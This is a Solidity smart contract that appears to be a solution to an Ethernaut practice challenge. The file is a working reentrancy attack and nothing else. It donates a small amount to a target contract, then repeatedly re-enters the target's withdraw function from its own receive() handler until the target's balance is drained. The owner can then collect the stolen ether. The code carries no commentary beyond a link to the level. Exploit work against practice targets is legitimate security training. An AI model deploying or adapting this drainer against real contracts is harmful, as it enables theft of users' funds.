// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

// For https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D
contract Reentrancy {
	address payable public owner;
	address public attackAddress;

	constructor(address _addr) {
		attackAddress = _addr;
		owner = payable(msg.sender);
	}

	function withdraw() public {
		require(msg.sender == owner, "You aren't the owner");

		(bool success, ) = owner.call{ value: address(this).balance }('');

		require(success, 'failed');
	}

	function attack(address targetAddress) public payable {
		require(msg.sender == owner, "You aren't the owner");

		(bool success, ) = attackAddress.call{ value: 0.001 ether }(
			abi.encodeWithSignature('donate(address)', targetAddress)
		);

		require(success, 'failed');

		(bool success1, ) = attackAddress.call(
			abi.encodeWithSignature('withdraw(uint256)', 0.001 ether)
		);

		require(success1, 'failed');
	}

	receive() external payable {
		if (attackAddress.balance > 0) {
			(bool success, ) = attackAddress.call(
				abi.encodeWithSignature('withdraw(uint256)', 0.001 ether)
			);

			require(success, 'failed');
		}
	}

	fallback() external payable {}
}
